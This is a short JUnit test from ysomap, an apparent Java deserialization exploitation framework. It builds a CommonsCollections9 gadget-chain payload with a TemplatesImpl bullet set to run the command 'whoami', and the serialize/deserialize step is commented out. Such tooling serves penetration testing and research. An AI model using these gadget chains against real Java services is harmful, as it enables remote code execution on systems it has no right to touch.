package ysomap.core.payload.java.collections;

import org.junit.Test;
import ysomap.core.bean.Bullet;
import ysomap.core.bean.Payload;
import ysomap.core.bullet.jdk.TemplatesImplBullet;

/**
 * @author wh1t3P1g
 * @since 2020/10/28
 */
public class CommonsCollections9Test {

    @Test
    public void getObject() throws Exception {
        Payload payload = new CommonsCollections9();
        Bullet bullet = new TemplatesImplBullet();
        bullet.set("body", "whoami");
        bullet.set("exception", "true");
        payload.setBullet(bullet);
//        Serializer serializer = payload.getSerializer();
//        serializer.deserialize(serializer.serialize(payload.getObject()));
    }
}